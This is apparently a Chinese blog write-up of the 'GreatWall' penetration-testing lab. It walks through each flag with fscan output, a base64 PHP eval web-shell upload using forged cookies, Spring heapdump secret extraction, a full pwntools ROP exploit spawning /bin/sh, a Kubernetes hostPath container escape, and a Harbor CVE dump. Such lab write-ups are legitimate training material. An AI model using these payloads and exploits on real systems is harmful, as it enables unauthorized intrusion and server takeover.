@@ -1,0 +1,374 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>春秋云镜GreatWall | P4tt0n's b10g</title><meta name="author" content="P4tt0n"><meta name="copyright" content="P4tt0n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="GreatWall 在这个靶场中，您将扮演一名渗透测试工程师，接受雇佣任务来评估“SmartLink Technologies Ltd.”公司的网络安全状况。 您的任务是首先入侵该公司暴露在公网上的应用服务，然后运用后渗透技巧深入 SmartLink公司的内部网络。在这个过程中，您将寻找潜在的弱点和漏洞，并逐一接管所有服务，从而控制整个内部网络。靶场中共设置了6个Flag，它们分布在不同的靶机上，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜GreatWall">
+<meta property="og:url" content="https://p4tt0n.github.io/2025/04/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/index.html">
+<meta property="og:site_name" content="P4tt0n's b10g">
+<meta property="og:description" content="GreatWall 在这个靶场中，您将扮演一名渗透测试工程师，接受雇佣任务来评估“SmartLink Technologies Ltd.”公司的网络安全状况。 您的任务是首先入侵该公司暴露在公网上的应用服务，然后运用后渗透技巧深入 SmartLink公司的内部网络。在这个过程中，您将寻找潜在的弱点和漏洞，并逐一接管所有服务，从而控制整个内部网络。靶场中共设置了6个Flag，它们分布在不同的靶机上，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg">
+<meta property="article:published_time" content="2025-04-26T01:11:56.000Z">
+<meta property="article:modified_time" content="2025-04-26T01:16:10.058Z">
+<meta property="article:author" content="P4tt0n">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg"><link rel="shortcut icon" href="https://pic.imge.cc/2024/08/01/66ab32dd0cc03.png"><link rel="canonical" href="https://p4tt0n.github.io/2025/04/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=4.14.0-b3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>(()=>{
+      const saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+      
+      window.btf = {
+        saveToLocal: saveToLocal,
+        getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+          script.src = url
+          script.async = true
+          script.onerror = reject
+          script.onload = script.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            script.onload = script.onreadystatechange = null
+            resolve()
+          }
+
+          Object.keys(attr).forEach(key => {
+            script.setAttribute(key, attr[key])
+          })
+
+          document.head.appendChild(script)
+        }),
+
+        getCSS: (url, id = false) => new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+          link.rel = 'stylesheet'
+          link.href = url
+          if (id) link.id = id
+          link.onerror = reject
+          link.onload = link.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            link.onload = link.onreadystatechange = null
+            resolve()
+          }
+          document.head.appendChild(link)
+        }),
+
+        addGlobalFn: (key, fn, name = false, parent = window) => {
+          const pjaxEnable = false
+          if (!pjaxEnable && key.startsWith('pjax')) return
+
+          const globalFn = parent.globalFn || {}
+          const keyObj = globalFn[key] || {}
+    
+          if (name && keyObj[name]) return
+    
+          name = name || Object.keys(keyObj).length
+          keyObj[name] = fn
+          globalFn[key] = keyObj
+          parent.globalFn = globalFn
+        }
+      }
+    
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+      
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })()</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '春秋云镜GreatWall',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-04-26 09:16:10'
+}</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="./themes/butterfly/source/css/custom.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="./themes/butterfly/source/css/modify.css"><link rel="stylesheet" href="./themes/butterfly/source/css/transpancy.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', () => { preloader.initLoading() }, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', () => { preloader.endLoading() }, 'preloader_end')
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic2.zhimg.com/32098d0cc61d44d6151fb7614211d256_r.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="P4tt0n's b10g"><img class="site-icon" src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" alt="Logo"><span class="site-name">P4tt0n's b10g</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">春秋云镜GreatWall</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-26T01:11:56.000Z" title="发表于 2025-04-26 09:11:56">2025-04-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-26T01:16:10.058Z" title="更新于 2025-04-26 09:16:10">2025-04-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>10分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="春秋云镜GreatWall"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url('https://pic2.zhimg.com/32098d0cc61d44d6151fb7614211d256_r.jpg');"></div><article class="post-content" id="article-container"><h1 id="GreatWall"><a href="#GreatWall" class="headerlink" title="GreatWall"></a>GreatWall</h1><blockquote>
+<p>在这个靶场中，您将扮演一名渗透测试工程师，接受雇佣任务来评估“SmartLink Technologies Ltd.”公司的网络安全状况。 您的任务是首先入侵该公司暴露在公网上的应用服务，然后运用后渗透技巧深入 SmartLink公司的内部网络。在这个过程中，您将寻找潜在的弱点和漏洞，并逐一接管所有服务，从而控制整个内部网络。靶场中共设置了6个Flag，它们分布在不同的靶机上，您需要找到并获取这些 Flag 作为您的成就目标。</p>
+</blockquote>
+<h3 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h3><p><code>./fscan -h 8.130.107.137</code></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">[+] 端口开放 8.130.107.137:80</span><br><span class="line">[+] 端口开放 8.130.107.137:22</span><br><span class="line">[+] 端口开放 8.130.107.137:8080</span><br><span class="line">[*] 网站标题 http://8.130.107.137      状态码:200 长度:10887  标题:""</span><br><span class="line">[*] 网站标题 http://8.130.107.137:8080 状态码:200 长度:1027   标题:Login Form</span><br><span class="line">[+] [发现漏洞] 目标: http://8.130.107.137:8080</span><br><span class="line">  漏洞类型: poc-yaml-thinkphp5023-method-rce</span><br><span class="line">  漏洞名称: poc1</span><br><span class="line">  详细信息: %!s(&lt;nil&gt;)</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2024/07/30/hello-world/l/image-20250425160908638.png" alt="image-20250425160908638"></p>
+<p><img src="/2024/07/30/hello-world/l/image-20250425160945688.png" alt="image-20250425160945688"></p>
+<h3 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h3><p><code>ifconfig</code></p>
+<p><img src="/2024/07/30/hello-world/l/image-20250425161222987.png" alt="image-20250425161222987"></p>
+<p>扫内网<code>./fscan -h 172.28.23.0/24</code></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">[+] 端口开放 172.28.23.26:22</span><br><span class="line">[+] 端口开放 172.28.23.26:21</span><br><span class="line">[+] 端口开放 172.28.23.17:80</span><br><span class="line">[+] 端口开放 172.28.23.26:80</span><br><span class="line">[+] 端口开放 172.28.23.33:8080</span><br><span class="line">[+] 端口开放 172.28.23.33:22</span><br><span class="line">[+] 端口开放 172.28.23.17:8080</span><br><span class="line">[+] 端口开放 172.28.23.17:22</span><br><span class="line">[*] 网站标题 http://172.28.23.17       状态码:200 长度:10887  标题:""</span><br><span class="line">[*] 网站标题 http://172.28.23.17:8080  状态码:200 长度:1027   标题:Login Form</span><br><span class="line">[*] 网站标题 http://172.28.23.26       状态码:200 长度:13693  标题:新翔OA管理系统-OA管理平台联系电话：13849422648微信同号，QQ958756413</span><br><span class="line">[+] ftp 172.28.23.26:21:anonymous </span><br><span class="line">   [-&gt;]OASystem.zip</span><br><span class="line">[*] 网站标题 http://172.28.23.33:8080  状态码:302 长度:0      标题:无标题 重定向地址: http://172.28.23.33:8080/login;jsessionid=8079E5596DD268F304C84B1BEAA0AABA</span><br><span class="line">[*] 网站标题 http://172.28.23.33:8080/login;jsessionid=8079E5596DD268F304C84B1BEAA0AABA 状态码:200 长度:3860   标题:智联科技 ERP 后台登陆</span><br><span class="line">[+] [发现漏洞] 目标: http://172.28.23.17:8080</span><br><span class="line">  漏洞类型: poc-yaml-thinkphp5023-method-rce</span><br><span class="line">  漏洞名称: poc1</span><br><span class="line">  详细信息: %!s(&lt;nil&gt;)</span><br><span class="line">[+] [发现漏洞] 目标: http://172.28.23.33:8080</span><br><span class="line">  漏洞类型: poc-yaml-spring-actuator-heapdump-file</span><br><span class="line">  漏洞名称: </span><br><span class="line">  详细信息: %!s(&lt;nil&gt;)</span><br><span class="line">[+] [发现漏洞] 目标: http://172.28.23.33:8080</span><br><span class="line">  漏洞类型: poc-yaml-springboot-env-unauth</span><br><span class="line">  漏洞名称: spring2</span><br><span class="line">  详细信息: %!s(&lt;nil&gt;)</span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<p>总结如下：</p>
+<p>172.28.23.17 外网（已拿下</p>
+<p>172.28.23.26 新翔OA</p>
+<p>172.28.23.33 智联科技erp</p>
+</blockquote>
+<p>打一下新翔OA， ftp匿名登陆,下载源码</p>
+<p><img src="/2024/07/30/hello-world/l/image-20250425162125520.png" alt="image-20250425162125520"></p>
+<p>找到登录的代码逻辑</p>
+<p><img src="/2024/07/30/hello-world/l/image-20250425162333447.png" alt="image-20250425162333447"></p>
+<p><code>Cookie: id=1;loginname=1;jueseid=1;danweiid=1;quanxian=1</code> 直接登录，但是没啥用</p>
+<p><a target="_blank" rel="noopener" href="http://172.28.23.26/uploadbase64.php">http://172.28.23.26/uploadbase64.php</a> 存在文件上传</p>
+<p><img src="/2024/07/30/hello-world/l/image-20250425162509547.png" alt="image-20250425162509547"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">POST /uploadbase64.php HTTP/1.1</span><br><span class="line">Host: 172.28.23.26</span><br><span class="line">Cookie: id=1; loginname=1; jueseid=1; danweiid=1; quanxian=1;</span><br><span class="line">Content-Length: 69</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">imgbase64=data:image/php;base64, PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p><img src="/2024/07/30/hello-world/l/image-20250425162740981.png" alt="image-20250425162740981"></p>
+<p>使用插件绕过</p>
+<p><img src="/2024/07/30/hello-world/l/image-20250425170355409.png" alt="image-20250425170355409"></p>
+<p><img src="/2024/07/30/hello-world/l/image-20250425170420701.png" alt="image-20250425170420701"></p>
+<h3 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h3><p>访问这个<a target="_blank" rel="noopener" href="http://172.28.23.33:8080/actuator/heapdump%E6%8B%BF%E5%88%B0heapdump">http://172.28.23.33:8080/actuator/heapdump拿到heapdump</a></p>
+<p><code>java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump</code></p>
+<p>选GCM模式，key：AZYyIgMYhG6/CzIJlvpR2g==</p>
+<p><img src="/2024/07/30/hello-world/l/image-20250425172809215.png" alt="image-20250425172809215"></p>
+<p>拿到pwn附件，借鉴一个脚本打一下</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">key,data=<span class="string">'b'</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b'Option:'</span>,<span class="string">b'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b'Key:'</span>,key)</span><br><span class="line">    p.sendlineafter(<span class="string">b'Data:'</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">key</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b'Option:'</span>,<span class="string">b'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b"Key: "</span>,key);</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">key,data</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b'Option:'</span>,<span class="string">b'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b'Key:'</span>,key)</span><br><span class="line">    p.sendlineafter(<span class="string">b'Data:'</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">name</span>(<span class="params">username</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b'Option:'</span>,<span class="string">b'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b'name:'</span>,username)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'172.28.23.33'</span>, <span class="number">59696</span>)</span><br><span class="line"><span class="comment"># p = process('./HashNote')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">username=<span class="number">0x5dc980</span></span><br><span class="line">stack=<span class="number">0x5e4fa8</span></span><br><span class="line">ukey=<span class="string">b'\x30'</span>*<span class="number">5</span>+<span class="string">b'\x31'</span>+<span class="string">b'\x44'</span></span><br><span class="line"></span><br><span class="line">fake_chunk=flat({</span><br><span class="line">    <span class="number">0</span>:username+<span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0x10</span>:[username+<span class="number">0x20</span>,<span class="built_in">len</span>(ukey),\</span><br><span class="line">        ukey,<span class="number">0</span>],</span><br><span class="line">    <span class="number">0x30</span>:[stack,<span class="number">0x10</span>]</span><br><span class="line">    },filler=<span class="string">b'\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b'name'</span>,fake_chunk)</span><br><span class="line">p.sendlineafter(<span class="string">b'word'</span>,<span class="string">'freep@ssw0rd:3'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b'\x30'</span>*<span class="number">1</span>+<span class="string">b'\x31'</span>+<span class="string">b'\x44'</span>,<span class="string">b'test'</span>)   <span class="comment"># 126</span></span><br><span class="line">add(<span class="string">b'\x30'</span>*<span class="number">2</span>+<span class="string">b'\x31'</span>+<span class="string">b'\x44'</span>,<span class="string">b'test'</span>)   <span class="comment"># 127</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(ukey)</span><br><span class="line">main_ret=u64(p.read(<span class="number">8</span>))-<span class="number">0x1e0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rdi=<span class="number">0x0000000000405e7c</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">rsi=<span class="number">0x000000000040974f</span> <span class="comment"># pop rsi ; ret</span></span><br><span class="line">rdx=<span class="number">0x000000000053514b</span> <span class="comment"># pop rdx ; pop rbx ; ret</span></span><br><span class="line">rax=<span class="number">0x00000000004206ba</span> <span class="comment"># pop rax ; ret</span></span><br><span class="line">syscall=<span class="number">0x00000000004560c6</span> <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">fake_chunk=flat({</span><br><span class="line">    <span class="number">0</span>:username+<span class="number">0x20</span>,</span><br><span class="line">    <span class="number">0x20</span>:[username+<span class="number">0x30</span>,<span class="built_in">len</span>(ukey),\</span><br><span class="line">        ukey,<span class="number">0</span>],</span><br><span class="line">    <span class="number">0x40</span>:[main_ret,<span class="number">0x100</span>,<span class="string">b'/bin/sh\x00'</span>]</span><br><span class="line">    },filler=<span class="string">b'\x00'</span>)</span><br><span class="line"></span><br><span class="line">name(fake_chunk.ljust(<span class="number">0x80</span>,<span class="string">b'\x00'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=flat([</span><br><span class="line">    rdi,username+<span class="number">0x50</span>,</span><br><span class="line">    rsi,<span class="number">0</span>,</span><br><span class="line">    rdx,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">    rax,<span class="number">0x3b</span>,</span><br><span class="line">    syscall</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b'Option:'</span>,<span class="string">b'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b'Key:'</span>,ukey)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">b'Option:'</span>,<span class="string">b'9'</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2024/07/30/hello-world/l/image-20250425202416190.png" alt="image-20250425202416190"></p>
+<h3 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h3><p>查看OA的网络，发现另一个网段</p>
+<p><img src="/2024/07/30/hello-world/l/image-20250425172756704.png" alt="image-20250425172756704"></p>
+<p>fscan扫一下</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">[+] 端口开放 172.22.14.6:80</span><br><span class="line">[+] 端口开放 172.22.14.37:2379</span><br><span class="line">[+] 端口开放 172.22.14.46:80</span><br><span class="line">[+] 端口开放 172.22.14.6:22</span><br><span class="line">[+] 端口开放 172.22.14.46:22</span><br><span class="line">[+] 端口开放 172.22.14.6:21</span><br><span class="line">[+] 端口开放 172.22.14.37:22</span><br><span class="line">[+] 端口开放 172.22.14.37:10250</span><br><span class="line">[*] 网站标题 http://172.22.14.46       状态码:200 长度:785    标题:Harbor</span><br><span class="line">[*] 网站标题 http://172.22.14.6        状态码:200 长度:13693  标题:新翔OA管理系统-OA管理平台联系电话：13849422648微信同号，QQ958756413</span><br><span class="line">[+] 发现指纹 目标: http://172.22.14.46       指纹: [Harbor]</span><br><span class="line">[*] 网站标题 https://172.22.14.37:10250 状态码:404 长度:19     标题:无标题</span><br><span class="line">[+] ftp 172.22.14.6:21:anonymous </span><br><span class="line">   [-&gt;]OASystem.zip</span><br><span class="line">[+] 检测到漏洞 http://172.22.14.46/swagger.json poc-yaml-swagger-ui-unauth 参数:[{path swagger.json}]</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<p>总结</p>
+<p>172.22.14.6 pwn</p>
+<p>172.22.14.37 K8S</p>
+<p>172.22.14.46 Harbor</p>
+</blockquote>
+<p>打k8s</p>
+<p><a target="_blank" rel="noopener" href="https://zone.huoxian.cn/d/1153-k8s">浅析K8S各种未授权攻击方法 - 火线 Zone-安全攻防社区</a></p>
+<p><code>./fscan -h 172.22.14.37 -p 1-65535</code></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">172.22.14.37:22 open</span><br><span class="line">172.22.14.37:2380 open</span><br><span class="line">172.22.14.37:2379 open</span><br><span class="line">172.22.14.37:6443 open</span><br><span class="line">172.22.14.37:10251 open</span><br><span class="line">172.22.14.37:10252 open</span><br><span class="line">172.22.14.37:10256 open</span><br><span class="line">172.22.14.37:10250 open</span><br><span class="line">[*] WebTitle http://172.22.14.37:10251 code:404 len:19     title:None</span><br><span class="line">[*] WebTitle http://172.22.14.37:10252 code:404 len:19     title:None</span><br><span class="line">[*] WebTitle http://172.22.14.37:10256 code:404 len:19     title:None</span><br><span class="line">[*] WebTitle https://172.22.14.37:6443 code:200 len:4671   title:None</span><br><span class="line">[*] WebTitle https://172.22.14.37:10250 code:404 len:19     title:None</span><br><span class="line">[+] PocScan https://172.22.14.37:6443 poc-yaml-go-pprof-leak </span><br><span class="line">[+] PocScan https://172.22.14.37:6443 poc-yaml-kubernetes-unauth</span><br></pre></td></tr></tbody></table></figure>
+
+<p>fscan扫到了10250端口，这个端口有个<code>k8s kubelet 10250端口未授权</code>，但是不符合利用条件</p>
+<p>尝试另一个6443端口的Api Server未授权</p>
+<p><img src="/2024/07/30/hello-world/l/image-20250425210455115.png" alt="image-20250425210455115"></p>
+<p>把虚拟机的流量代理出来，参考<a target="_blank" rel="noopener" href="https://blog.zgsec.cn/archives/278.html">渗透必备：使用Proxifier玩转代理 - AabyssZG’s Blog</a></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: nginx-deployment</span><br><span class="line">  labels:</span><br><span class="line">    app: nginx</span><br><span class="line">spec:</span><br><span class="line">  replicas: 1</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: nginx</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: nginx</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">      - name: nginx</span><br><span class="line">        image: nginx:1.8</span><br><span class="line">        volumeMounts:</span><br><span class="line">        - mountPath: /mnt</span><br><span class="line">          name: test-volume</span><br><span class="line">      volumes:</span><br><span class="line">      - name: test-volume</span><br><span class="line">        hostPath:</span><br><span class="line">          path: /</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ apply -f eval.yaml</code></p>
+<p><img src="/2024/07/30/hello-world/l/image-20250425221529354.png" alt="image-20250425221529354"></p>
+<p>查看pod</p>
+<p><code>kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods</code></p>
+<p><img src="/2024/07/30/hello-world/l/image-20250425221603184.png" alt="image-20250425221603184"></p>
+<p><code>kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ exec -it nginx-deployment-864f8bfd6f-g6c4b -- /bin/bash</code></p>
+<p><img src="/2024/07/30/hello-world/l/image-20250425221655786.png" alt="image-20250425221655786"></p>
+<p>成功进入容器。mnt挂载了宿主机的目录。直接进去找flag,在mysql里的历史记录找到flag。</p>
+<p><img src="/2024/07/30/hello-world/l/image-20250425221738335.png" alt="image-20250425221738335"></p>
+<p><img src="/2024/07/30/hello-world/l/image-20250425221514335.png" alt="image-20250425221514335"></p>
+<h3 id="flag05"><a href="#flag05" class="headerlink" title="flag05"></a>flag05</h3><p>打harbor <a target="_blank" rel="noopener" href="https://github.com/404tk/CVE-2022-46463">404tk/CVE-2022-46463: harbor unauthorized detection</a></p>
+<p><img src="/2024/07/30/hello-world/l/image-20250425174633179.png" alt="image-20250425174633179"></p>
+<p><code>proxychains python harbor.py http://172.22.14.46/ --dump harbor/secret --v2</code></p>
+<p><img src="/2024/07/30/hello-world/l/image-20250425174551403.png" alt="image-20250425174551403"></p>
